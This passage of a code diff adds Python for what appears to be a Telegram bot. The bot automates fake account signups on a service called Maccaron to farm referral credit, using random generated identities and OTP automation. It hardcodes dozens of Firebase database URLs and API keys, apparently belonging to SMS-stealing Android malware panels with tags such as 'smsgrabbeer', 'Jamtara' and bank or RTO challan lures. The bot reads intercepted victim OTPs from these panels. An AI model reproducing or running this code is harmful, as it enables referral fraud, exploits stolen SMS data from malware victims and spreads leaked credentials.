+                         (int(n), time.time(), str(user_id)))
+            conn.commit()
+        finally:
+            conn.close()
+
+
+def add_points(user_id, n):
+    _inc_field(user_id, "points", int(n))
+
+
+def set_points(user_id, n):
+    update_user(user_id, points=int(n))
+
+
+def can_use(user_id):
+    # ADMIN: full access, unlimited usage
+    if is_admin(user_id):
+        return True, 999999
+    u = get_user(user_id)
+    if not u or u["points"] <= 0:
+        return False, 0
+    return True, u["points"]
+
+
+def consume_point(user_id):
+    # ADMIN: never deduct points (unlimited)
+    if is_admin(user_id):
+        return True
+    u = get_user(user_id)
+    if not u or u["points"] <= 0:
+        return False
+    with _db_lock:
+        conn = _conn()
+        try:
+            cur = conn.execute("UPDATE users SET points = points - ? WHERE user_id=? AND points >= ?",
+                               (POINTS_PER_USE, str(user_id), POINTS_PER_USE))
+            conn.commit()
+            return cur.rowcount > 0
+        finally:
+            conn.close()
+
+
+# ── referral ──
+def add_referral(referrer_id, referred_id):
+    referrer_id = str(referrer_id)
+    referred_id = str(referred_id)
+    if referrer_id == referred_id or not referrer_id:
+        return False
+    with _db_lock:
+        conn = _conn()
+        try:
+            cur = conn.execute(
+                "INSERT OR IGNORE INTO referrals(referrer_id, referred_id, created_at) VALUES(?,?,?)",
+                (referrer_id, referred_id, time.time()))
+            conn.commit()
+            return cur.lastrowid is not None and cur.rowcount > 0
+        except sqlite3.IntegrityError:
+            return False
+        finally:
+            conn.close()
+
+
+def get_pending_referral(referred_id):
+    with _db_lock:
+        conn = _conn()
+        try:
+            row = conn.execute(
+                "SELECT * FROM referrals WHERE referred_id=? AND credited=0", (str(referred_id),)
+            ).fetchone()
+            return dict(row) if row else None
+        finally:
+            conn.close()
+
+
+def credit_referral(referred_id):
+    """Referee ke captcha complete hote hi referrer ko +REFERRAL_POINTS."""
+    pending = get_pending_referral(referred_id)
+    if not pending:
+        return None
+    referrer_id = pending["referrer_id"]
+    with _db_lock:
+        conn = _conn()
+        try:
+            cur = conn.execute(
+                "UPDATE referrals SET credited=1 WHERE referred_id=? AND credited=0",
+                (str(referred_id),))
+            conn.commit()
+            if cur.rowcount <= 0:
+                return None
+        finally:
+            conn.close()
+    add_points(referrer_id, REFERRAL_POINTS)
+    _inc_field(referrer_id, "referral_count", 1)
+    return referrer_id
+
+
+def get_ref_count(referrer_id):
+    u = get_user(referrer_id)
+    return u["referral_count"] if u else 0
+
+
+def get_referrals(referrer_id, limit=20):
+    with _db_lock:
+        conn = _conn()
+        try:
+            rows = conn.execute(
+                "SELECT r.referred_id, u.username, u.full_name, r.created_at "
+                "FROM referrals r LEFT JOIN users u ON u.user_id=r.referred_id "
+                "WHERE r.referrer_id=? ORDER BY r.id DESC LIMIT ?",
+                (str(referrer_id), int(limit))).fetchall()
+            return [dict(x) for x in rows]
+        finally:
+            conn.close()
+
+
+# ── captcha ──
+def make_captcha():
+    op = random.choice(["+", "-", "*"])
+    if op == "+":
+        a, b = random.randint(5, 15), random.randint(5, 15)
+    elif op == "-":
+        a = random.randint(10, 25)
+        b = random.randint(2, a - 1)
+    else:
+        a, b = random.randint(3, 9), random.randint(3, 9)
+    ans = {"+": a + b, "-": a - b, "*": a * b}[op]
+    opts = {ans}
+    guard = 0
+    while len(opts) < 4 and guard < 60:
+        guard += 1
+        cand = ans + random.randint(-8, 8)
+        if cand >= 0:
+            opts.add(cand)
+    pool = list(range(0, ans + 12))
+    random.shuffle(pool)
+    for x in pool:
+        if len(opts) >= 4:
+            break
+        opts.add(x)
+    opts = list(opts)[:4]
+    random.shuffle(opts)
+    return op, a, b, ans, opts
+
+
+# ── result / phone tracking (kept from original) ──
+def log_result(phone, name, email, status, details="", referral_code="", user_id=""):
+    with _db_lock:
+        conn = _conn()
+        try:
+            conn.execute(
+                "INSERT INTO results(phone,name,email,status,details,referral_code,user_id,ts) VALUES(?,?,?,?,?,?,?,?)",
+                (phone, name, email, status, details, referral_code, user_id, time.time()))
+            existing = conn.execute(
+                "SELECT count, status FROM user_phones WHERE user_id=? AND phone=?",
+                (str(user_id), phone)).fetchone()
+            if existing:
+                conn.execute(
+                    "UPDATE user_phones SET last_seen=?, status=?, referral_code=?, count=count+1 WHERE user_id=? AND phone=?",
+                    (time.time(), status, referral_code, str(user_id), phone))
+            else:
+                try:
+                    conn.execute(
+                        "INSERT INTO user_phones(user_id,phone,first_seen,last_seen,status,referral_code,count) VALUES(?,?,?,?,?,?,?)",
+                        (str(user_id), phone, time.time(), time.time(), status, referral_code, 1))
+                except sqlite3.IntegrityError:
+                    conn.execute(
+                        "UPDATE user_phones SET last_seen=?, status=?, referral_code=?, count=count+1 WHERE user_id=? AND phone=?",
+                        (time.time(), status, referral_code, str(user_id), phone))
+            conn.commit()
+        finally:
+            conn.close()
+
+
+def get_user_success_count(user_id):
+    with _db_lock:
+        conn = _conn()
+        try:
+            return conn.execute("SELECT COUNT(*) FROM user_phones WHERE user_id=? AND status='success'",
+                                (str(user_id),)).fetchone()[0]
+        finally:
+            conn.close()
+
+
+def get_user_phone_status(user_id, phone):
+    with _db_lock:
+        conn = _conn()
+        try:
+            row = conn.execute("SELECT status FROM user_phones WHERE user_id=? AND phone=?",
+                               (str(user_id), phone)).fetchone()
+            return row[0] if row else None
+        finally:
+            conn.close()
+
+
+def get_user_total_processed(user_id):
+    with _db_lock:
+        conn = _conn()
+        try:
+            total = conn.execute("SELECT COUNT(*) FROM user_phones WHERE user_id=?", (str(user_id),)).fetchone()[0]
+            failed = conn.execute("SELECT COUNT(*) FROM user_phones WHERE user_id=? AND status!='success'",
+                                  (str(user_id),)).fetchone()[0]
+            return total, failed
+        finally:
+            conn.close()
+
+
+def get_user_recent_phones(user_id, limit=10):
+    with _db_lock:
+        conn = _conn()
+        try:
+            rows = conn.execute(
+                "SELECT phone, status FROM user_phones WHERE user_id=? ORDER BY last_seen DESC LIMIT ?",
+                (str(user_id), int(limit))).fetchall()
+            return [(r[0], r[1]) for r in rows]
+        finally:
+            conn.close()
+
+
+def get_global_stats():
+    with _db_lock:
+        conn = _conn()
+        try:
+            total_users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+            total_success = conn.execute("SELECT COUNT(*) FROM user_phones WHERE status='success'").fetchone()[0]
+            total_phones = conn.execute("SELECT COUNT(*) FROM user_phones").fetchone()[0]
+            return total_users, total_success, total_phones
+        finally:
+            conn.close()
+
+
+def get_all_users(offset=0, limit=20):
+    with _db_lock:
+        conn = _conn()
+        try:
+            rows = conn.execute(
+                "SELECT user_id, personal_code, maccaron_code, points, referral_count, captcha_ok, created_at "
+                "FROM users ORDER BY created_at DESC LIMIT ? OFFSET ?", (int(limit), int(offset))).fetchall()
+            return [dict(r) for r in rows]
+        finally:
+            conn.close()
+
+
+def reset_user_session(user_id):
+    with _db_lock:
+        conn = _conn()
+        try:
+            conn.execute("DELETE FROM users WHERE user_id=?", (str(user_id),))
+            conn.execute("DELETE FROM user_phones WHERE user_id=?", (str(user_id),))
+            conn.execute("DELETE FROM results WHERE user_id=?", (str(user_id),))
+            conn.commit()
+        finally:
+            conn.close()
+
+
+# ════════════════════════════════════════════════════════════════════
+#  CHANNEL CHECK
+# ════════════════════════════════════════════════════════════════════
+async def check_channel_joins(bot, user_id):
+    not_joined = []
+    for ch in REQUIRED_CHANNELS:
+        try:
+            member = await bot.get_chat_member(chat_id=ch["chat_id"], user_id=int(user_id))
+            if member.status in ("left", "kicked"):
+                not_joined.append(ch)
+        except Exception as e:
+            logger.error(f"Channel check {ch['chat_id']}: {e}")
+            not_joined.append(ch)
+    return not_joined
+
+
+def channel_join_keyboard():
+    rows = []
+    for ch in REQUIRED_CHANNELS:
+        rows.append([blue(f"📢 Join {ch['title']}",
+                          url=f"https://t.me/{ch['chat_id'].lstrip('@')}")])
+    rows.append([green("✅ I've Joined — Verify", cdata="action_check_joined")])
+    rows.append([red("🔙 Back", cdata="action_back_to_start")])
+    return InlineKeyboardMarkup(rows)
+
+
+# ════════════════════════════════════════════════════════════════════
+#  MACCARON API
+# ════════════════════════════════════════════════════════════════════
+def generate_random_user():
+    first_names = [
+        "Rajat", "Amit", "Suresh", "Priya", "Ananya", "Rahul",
+        "Neha", "Vikram", "Kavya", "Arjun", "Deepa", "Ravi",
+        "Meera", "Kiran", "Pooja", "Sanjay", "Lata", "Vivek",
+        "Sunita", "Manish",
+    ]
+    last_names = [
+        "Kumar", "Sharma", "Patel", "Singh", "Gupta", "Reddy",
+        "Nair", "Mehta", "Joshi", "Verma", "Das", "Rao",
+        "Pillai", "Chauhan", "Agarwal", "Bhat", "Iyer", "Malhotra",
+    ]
+    first = random.choice(first_names)
+    last = random.choice(last_names)
+    random_str = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+    email = f"{first.lower()}{random_str}@gmail.com"
+    password = "".join(random.choices(string.digits, k=11))
+    return first, last, email, password
+
+
+def send_create_otp(phone):
+    payload = {
+        "operationName": "createOtp",
+        "variables": {"input": {"receiver": phone}},
+        "query": "mutation createOtp($input: OtpInput!) {\n  createOtp(input: $input) {\n    otp {\n      receiver\n      status\n      __typename\n    }\n    errors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}",
+    }
+    try:
+        resp = requests.post(GRAPHQL_URL, headers=HEADERS, json=payload, timeout=15)
+        try:
+            data = resp.json()
+            if data is None:
+                return {"error": "API returned null response"}
+            return data
+        except ValueError:
+            return {"error": f"Invalid JSON response: {resp.text[:200]}"}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def verify_otp(phone, otp):
+    payload = {
+        "operationName": "verifyOtp",
+        "variables": {"input": {"receiver": phone, "value": otp}},
+        "query": "mutation verifyOtp($input: VerifyOtpInput!) {\n  verifyOtp(input: $input) {\n    otp {\n      id\n      receiver\n      value\n      status\n      __typename\n    }\n    verified\n    errors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}",
+    }
+    try:
+        resp = requests.post(GRAPHQL_URL, headers=HEADERS, json=payload, timeout=15)
+        try:
+            data = resp.json()
+            if data is None:
+                return {"error": "API returned null response"}
+            return data
+        except ValueError:
+            return {"error": f"Invalid JSON response: {resp.text[:200]}"}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def customer_signup(first_name, last_name, email, password, otp_id, otp_value, mobile, referral_code):
+    payload = {
+        "operationName": "customerSignUp",
+        "variables": {
+            "input": {
+                "firstName": first_name, "lastName": last_name, "email": email,
+                "password": password, "otpId": otp_id, "otpValue": otp_value,
+                "mobileNumber": mobile, "referralCode": referral_code,
+                "cartToken": None, "signupPlatform": "Web",
+            }
+        },
+        "query": "mutation customerSignUp($input: CustomerSignUpInput!) {\n  customerSignUp(input: $input) {\n    user {\n      id\n      email\n      __typename\n    }\n    errors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}",
+    }
+    try:
+        resp = requests.post(GRAPHQL_URL, headers=HEADERS, json=payload, timeout=15)
+        try:
+            data = resp.json()
+            if data is None:
+                return {"error": "API returned null response"}
+            return data
+        except ValueError:
+            return {"error": f"Invalid JSON response: {resp.text[:200]}"}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def do_send_otp(phone, referral_code, user_id):
+    with API_SEMAPHORE:
+        api_phone = phone[-10:] if len(phone) > 10 else phone
+        first_name, last_name, email, password = generate_random_user()
+        full_name = f"{first_name} {last_name}"
+        otp_response = send_create_otp(api_phone)
+        if not isinstance(otp_response, dict):
+            otp_response = {"error": f"Unexpected response: {otp_response}"}
+        if "error" in otp_response:
+            msg = otp_response["error"]
+            log_result(phone, full_name, email, "otp_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "otp_failed", "reason": msg}
+        gql_errors = otp_response.get("errors") or []
+        if gql_errors:
+            msg = gql_errors[0].get("message", "Unknown GraphQL error")
+            log_result(phone, full_name, email, "otp_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "otp_failed", "reason": msg}
+        otp_data = (otp_response.get("data") or {}).get("createOtp") or {}
+        otp_status = (otp_data.get("otp") or {}).get("status")
+        if otp_status != "SENT":
+            errors = otp_data.get("errors", [])
+            msg = errors[0]["message"] if errors else f"OTP not sent (status: {otp_status})"
+            log_result(phone, full_name, email, "otp_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "otp_failed", "reason": msg}
+        return {"status": "otp_sent"}
+
+
+def do_verify_and_signup(phone, referral_code, otp, user_id):
+    with API_SEMAPHORE:
+        api_phone = phone[-10:] if len(phone) > 10 else phone
+        verify_response = verify_otp(api_phone, otp)
+        if not isinstance(verify_response, dict):
+            verify_response = {"error": f"Unexpected response: {verify_response}"}
+        if "error" in verify_response:
+            msg = verify_response["error"]
+            log_result(phone, "", "", "verify_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "verify_failed", "reason": msg}
+        gql_errors = verify_response.get("errors") or []
+        if gql_errors:
+            msg = gql_errors[0].get("message", "Unknown GraphQL error")
+            log_result(phone, "", "", "verify_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "verify_failed", "reason": msg}
+        verify_data = (verify_response.get("data") or {}).get("verifyOtp") or {}
+        if not verify_data.get("verified"):
+            errors = verify_data.get("errors", [])
+            msg = errors[0]["message"] if errors else "OTP verification failed"
+            log_result(phone, "", "", "verify_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "verify_failed", "reason": msg}
+        otp_id = verify_data["otp"]["id"]
+        otp_value = verify_data["otp"]["value"]
+        first_name, last_name, email, password = generate_random_user()
+        full_name = f"{first_name} {last_name}"
+        signup_response = customer_signup(
+            first_name, last_name, email, password, otp_id, otp_value, api_phone, referral_code)
+        if not isinstance(signup_response, dict):
+            signup_response = {"error": f"Unexpected response: {signup_response}"}
+        if "error" in signup_response:
+            msg = signup_response["error"]
+            log_result(phone, full_name, email, "signup_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "signup_failed", "reason": msg}
+        gql_errors = signup_response.get("errors") or []
+        if gql_errors:
+            msg = gql_errors[0].get("message", "Unknown GraphQL error")
+            log_result(phone, full_name, email, "signup_failed", details=msg,
+                       referral_code=referral_code, user_id=user_id)
+            return {"status": "signup_failed", "reason": msg}
+        signup = (signup_response.get("data") or {}).get("customerSignUp") or {}
+        if signup.get("user"):
+            log_result(phone, full_name, email, "success",
+                       referral_code=referral_code, user_id=user_id)
+            return {
+                "status": "success", "name": full_name,
+                "email": email, "user_maccaron_id": signup["user"]["id"],
+            }
+        errors = signup.get("errors", [])
+        msg = errors[0]["message"] if errors else str(signup_response)
+        log_result(phone, full_name, email, "signup_failed", details=msg,
+                   referral_code=referral_code, user_id=user_id)
+        return {"status": "signup_failed", "reason": msg}
+
+
+# ════════════════════════════════════════════════════════════════════
+#  FIREBASE AUTO-OTP AUTOMATION  (UJALA-pattern: All_Users/sms/{device_id})
+# ════════════════════════════════════════════════════════════════════
+import json as _json
+import threading
+
+# Maccaron OTP SMS: "695486 is your Maccaron verification OTP for mobile ..."
+MACCARON_OTP_RE = re.compile(r"(\d{4,6})\s+is your Maccaron verification OTP", re.IGNORECASE)
+
+
+def extract_maccaron_otp(body):
+    """Robustly pull the 6-digit Maccaron OTP from an SMS body.
+
+    Matches the exact Maccaron format: '<6 digits> is your Maccaron verification OTP...'
+    Falls back to any standalone 6-digit code when 'maccaron' appears in the body.
+    """
+    if not body:
+        return None
+    body = str(body)
+    low = body.lower()
+    if "maccaron" in low or "macron" in low or "maccrn" in low:
+        m = re.search(r"(?<![\d.])(\d{6})(?![\d.])", body)
+        if m:
+            return m.group(1)
+    m = MACCARON_OTP_RE.search(body)
+    if m:
+        return m.group(1)
+    m = re.search(r"\b(\d{6})\b", body)
+    return m.group(1) if m else None
+
+# Global automation state
+AUTO_RUNNING = {"v": False}
+AUTO_STOP_REQUESTED = {"v": False}
+
+
+FIREBASE_PANELS = [
+    {"tag": '47.apk', "url": 'https://hdjdjdj-a73f2-default-rtdb.firebaseio.com', "keys": ['AIzaSyCPJL-eDjeLSamlXrLz44ONBevUgSTVxzU']},
+    {"tag": '61.apk', "url": 'https://muajob-29c86-default-rtdb.firebaseio.com', "keys": ['AIzaSyCMNuhFzhoDzPMbc3m7kUvm-qYD2fxhuy0']},
+    {"tag": '63.apk', "url": 'https://dark-274b4-default-rtdb.firebaseio.com', "keys": ['AIzaSyApSpNpxolCsK96UD2MZRVqoKR7qNu7hoE']},
+    {"tag": '65.apk', "url": 'https://dyydd-c53c8-default-rtdb.firebaseio.com', "keys": ['AIzaSyBIHeqqdiLPEzZ5CxpkSVh8J0jrSDqq9Y4']},
+    {"tag": '66.apk', "url": 'https://gjhghjj-3d251-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'AdminPanel.apk', "url": 'https://smsgrabbeer-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyC-yL_7j_FcnKNwpVT81oCsYTB4yt4mIRA']},
+    {"tag": 'Android (2).apk', "url": 'https://rantaishita-f7614-default-rtdb.firebaseio.com', "keys": ['AIzaSyAXeDnVzCBt7e-l1x5hb-2GZJr7wifUPDQ']},
+    {"tag": 'CARDTRY1-1.apk', "url": 'https://trying-90b4b-default-rtdb.firebaseio.com', "keys": ['AIzaSyAGUGYKDbUX1rFDhnk79dk3_XWIVxmXC-Y', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCyjAOZ3D45nzWaBn9pzEkdBUVlbxhCfMQ']},
+    {"tag": 'CARDTRY1-1.apk', "url": 'https://newgodx-5b008-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyAGUGYKDbUX1rFDhnk79dk3_XWIVxmXC-Y', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCyjAOZ3D45nzWaBn9pzEkdBUVlbxhCfMQ']},
+    {"tag": 'DamonPS2_Pro_-_PS2_Emulator_v5-0Pre2.apk', "url": 'https://damonps2-pro.firebaseio.com', "keys": ['AIzaSyC1MkFGHIJ2RmNBUWhll52tRnNkptMm5xo']},
+    {"tag": 'Firebase 1', "url": 'https://rahulcscperosnl-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'Firebase 2', "url": 'https://pm-kisan-05jg-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'Firebase 3', "url": 'https://ajna-20fc4-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'Firebase 4', "url": 'https://lalannew5-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'Firebase 5', "url": 'https://myapp-8228a-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'GK 27Nov rto challan admin.apk', "url": 'https://rc-39-15-default-rtdb.firebaseio.com', "keys": ['AIzaSyBSbWYMdNYM-0tCYdY-kizOpvzonPW_-1s']},
+    {"tag": 'GREEN PANEL ______ _ Ruff _ (2).apk', "url": 'https://ruff-panel-default-rtdb.firebaseio.com', "keys": ['AIzaSyBZHk0O8LYZSdbIZjbOihbgteb7QvV8LCA']},
+    {"tag": 'Jamtara ____ (3).apk', "url": 'https://yourfirebase-default-rtdb.firebaseio.com', "keys": ['AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ']},
+    {"tag": 'Jamtara ____ (3).apk', "url": 'https://server-2-a095f-default-rtdb.firebaseio.com', "keys": ['AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ']},
+    {"tag": 'Jamtara ____ (3).apk', "url": 'https://server-1-c3501-default-rtdb.firebaseio.com', "keys": ['AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ']},
+    {"tag": 'Jamtara ____ (3).apk', "url": 'https://server-3-e44be-default-rtdb.firebaseio.com', "keys": ['AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ']},
+    {"tag": 'Medicien panel.apk', "url": 'https://e5turnament2-default-rtdb.firebaseio.com', "keys": ['AIzaSyDj9pR0AaoGKIlje-0E6QQ5hUZH-3gh-_Q']},
+    {"tag": 'PM_ADMIN_L_V2.apk', "url": 'https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyBXJdXWfTCC4tSqD0nYXUbXaSISKhtjnrc']},
+    {"tag": 'Panda ____ Admin 181_1.0.apk', "url": 'https://jamtara181-default-rtdb.firebaseio.com', "keys": ['AIzaSyCv4JJw_4ruIYnNjwuWqnvmk4FZz1n7F4M']},
+    {"tag": 'Panel Wala V16.apk', "url": 'https://panel-wala-v16-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'Panel Wala V17.apk', "url": 'https://panel-wala-v11-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'Pm-Admin_v5_Final.apk', "url": 'https://navin512-54d6f-default-rtdb.firebaseio.com', "keys": ['AIzaSyBiCQmETLwj3ouuJkw7fCkhUtidDVh1x9I']},
+    {"tag": 'RTO 63 ADMIN.apk', "url": 'https://rto-63-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyBHNK2QS-P75DLud5130Uo8bUm5j_biKzU']},
+    {"tag": 'RTO ADMIN.apk', "url": 'https://activity-e16b3-default-rtdb.firebaseio.com', "keys": ['AIzaSyBg2FWKtNhoFd4Jd_dYIn3U2EUI3bsux4o']},
+    {"tag": 'RTO Admin_1.0 (2).apk', "url": 'https://smas-8bff8-default-rtdb.firebaseio.com', "keys": ['AIzaSyC6tb3NaodXCW4Qh8KR8xTW5BteUTbwMc8']},
+    {"tag": 'Rdx Admin 3.k.apk', "url": 'https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com', "keys": ['AIzaSyACVxRuQ_vZEFceetyCQbJG6o_KFp2Ggf0']},
+    {"tag": 'SPY MASTER.apk', "url": 'https://dyno-1b564-default-rtdb.firebaseio.com', "keys": ['AIzaSyCliMn51IHaR_mPG5MCSvWMK7toxntO7bQ']},
+    {"tag": 'Sam Admin_1.3.apk', "url": 'https://rexxx-4c7a7-default-rtdb.firebaseio.com', "keys": ['AIzaSyDnVaMQ1RY6R1SyFy65TO2bOQXOC_b2VRA']},
+    {"tag": 'Shoot Admin (2).apk', "url": 'https://kumarlive1-default-rtdb.firebaseio.com', "keys": ['AIzaSyAD6iCJUEDvl_XFCUZ0VeiGvH571FobXMM', 'AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E']},
+    {"tag": 'Shoot Admin 236 (2) (3).apk', "url": 'https://rahulcscperosnl-default-rtdb.firebaseio.com', "keys": ['AIzaSyA51lq8IG509h32yHtzaWWWzdyZNqemUkc', 'AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E']},
+    {"tag": 'Shoot Admin __.apk', "url": 'https://myapp-8228a-default-rtdb.firebaseio.com', "keys": ['AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E']},
+    {"tag": 'Shoot Admin-2.apk', "url": 'https://tryagainnew-58f1a-default-rtdb.firebaseio.com', "keys": ['AIzaSyATn6LDSqEYPCyY-yMKDhzVBO263WmYOqY', 'AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E']},
+    {"tag": 'Shoot Admin.apk', "url": 'https://lovefimus-default-rtdb.firebaseio.com', "keys": ['AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E', 'AIzaSyD2Ry06YV58BdIjbhX5nvdY6MN1IQaRqGk']},
+    {"tag": 'ZEN ADMIN_1.0.apk', "url": 'https://aaaa-b3749-default-rtdb.firebaseio.com', "keys": ['AIzaSyANHri0JIWEroUrloP97KGAcIOKMwT4UgU', 'AIzaSyD74TOQXfWjYvfwDQ06U38xhdRUIVJ4Afs']},
+    {"tag": '______ ____M__N 3_____1.0.apk', "url": 'https://boi-3-8914d-default-rtdb.firebaseio.com', "keys": ['AIzaSyDc4HYWT6jdXAZbRB8wAa_I5HwVcffGfgY']},
+    {"tag": '____________________ ____________________ - _____________ .a', "url": 'https://projectsb0810-default-rtdb.firebaseio.com', "keys": ['AIzaSyCAKj9lK1TggPOpafxeolFrhVz1hpepVlk']},
+    {"tag": 'access20', "url": 'https://access20-3fc38-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'adsdasd.apk', "url": 'https://totla-panel-default-rtdb.firebaseio.com', "keys": ['AIzaSyD6Mlr26HvFPHYIv6h1EQhGBGg52xc5Z7Q']},
+    {"tag": 'airto', "url": 'https://ai-rto-9-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'apkdriod', "url": 'https://apkdriod-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'apkdriod_f6fb9', "url": 'https://apkdriod-f6fb9-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'app2', "url": 'https://app-2-7ac78-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'asdtest', "url": 'https://asdtest-project-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'bankekyc', "url": 'https://bank-e-kyc-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'base (1) (10).apk', "url": 'https://rto9-d2b33-default-rtdb.firebaseio.com', "keys": ['AIzaSyC5pP7ZRx9h_Puc3nvbQ7-O8zzxVPXnl54']},
+    {"tag": 'base (2) (11).apk', "url": 'https://pp30-fc7e5-default-rtdb.firebaseio.com', "keys": ['AIzaSyADzHYWclidHTO9vu1u2Wo51dAClnJaAqg']},
+    {"tag": 'base (2) (4) (2).apk', "url": 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyBTebmiVIh2_vFMgPJ0heGQDSSGJT6oZNA']},
+    {"tag": 'base (2).apk', "url": 'https://rt51-6e1df-default-rtdb.firebaseio.com', "keys": ['AIzaSyByfSpvDUTzyEwIKgGfiupVSdUPMZe1vGs']},
+    {"tag": 'base (27).apk', "url": 'https://rto-e-chall-4-default-rtdb.firebaseio.com', "keys": ['AIzaSyC-U9fBwuK610sUjZ4UAwppaWzSGHv0Cfc']},
+    {"tag": 'base (28).apk', "url": 'https://yes2-ead3d-default-rtdb.firebaseio.com', "keys": ['AIzaSyCrhMuJqoSYIDc2O34nnCoqWXW9JVBYzlQ']},
+    {"tag": 'base (29).apk', "url": 'https://sbi-yono-i31an-default-rtdb.firebaseio.com', "keys": ['AIzaSyDXGhxslZRGq3W3aoNzZgEwPysRHh1ycXw']},
+    {"tag": 'base (3).apk', "url": 'https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyC0D_8y2VQ5rYqfPyr-anr67ewq1MskDZg']},
+    {"tag": 'base (31).apk', "url": 'https://rameshwar-7okt-default-rtdb.firebaseio.com', "keys": ['AIzaSyBQbjvGvphUOGhjJlGBn7M5c8nSsJDP_XA']},
+    {"tag": 'base (32).apk', "url": 'https://rto-44-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyArFzwZ1p3yOaTW-u6pEvjA44nIYIaCnzc']},
+    {"tag": 'base (35).apk', "url": 'https://jamtara74-c231e-default-rtdb.firebaseio.com', "keys": ['AIzaSyA9ViACbG-4iDooKvf-QEBq0ICoM-uT-f0', 'AIzaSyAy5QbbJwK0gHrt3-LZmbU7PxuVU6ZDw50', 'AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY', 'AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM', 'AIzaSyDDUhxUpo2jXam6ez8Wz92y9Kebf9cVtIA', 'AIzaSyDiiky_NvdG7tsU1MRQePT0-NuKHvVoFAQ', 'AIzaSyDmvtf9EwVSsffqOJarrAgWaGAhYa-m1_E']},
+    {"tag": 'base (35).apk', "url": 'https://raja252525raj-4ee9a-default-rtdb.firebaseio.com', "keys": ['AIzaSyA9ViACbG-4iDooKvf-QEBq0ICoM-uT-f0', 'AIzaSyAy5QbbJwK0gHrt3-LZmbU7PxuVU6ZDw50', 'AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY', 'AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM', 'AIzaSyDDUhxUpo2jXam6ez8Wz92y9Kebf9cVtIA', 'AIzaSyDiiky_NvdG7tsU1MRQePT0-NuKHvVoFAQ', 'AIzaSyDmvtf9EwVSsffqOJarrAgWaGAhYa-m1_E']},
+    {"tag": 'base (35).apk', "url": 'https://raj254346kumar-84033-default-rtdb.firebaseio.com', "keys": ['AIzaSyA9ViACbG-4iDooKvf-QEBq0ICoM-uT-f0', 'AIzaSyAy5QbbJwK0gHrt3-LZmbU7PxuVU6ZDw50', 'AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY', 'AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM', 'AIzaSyDDUhxUpo2jXam6ez8Wz92y9Kebf9cVtIA', 'AIzaSyDiiky_NvdG7tsU1MRQePT0-NuKHvVoFAQ', 'AIzaSyDmvtf9EwVSsffqOJarrAgWaGAhYa-m1_E']},
+    {"tag": 'base (35).apk', "url": 'https://salasali6990-1171d-default-rtdb.firebaseio.com', "keys": ['AIzaSyA9ViACbG-4iDooKvf-QEBq0ICoM-uT-f0', 'AIzaSyAy5QbbJwK0gHrt3-LZmbU7PxuVU6ZDw50', 'AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY', 'AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM', 'AIzaSyDDUhxUpo2jXam6ez8Wz92y9Kebf9cVtIA', 'AIzaSyDiiky_NvdG7tsU1MRQePT0-NuKHvVoFAQ', 'AIzaSyDmvtf9EwVSsffqOJarrAgWaGAhYa-m1_E']},
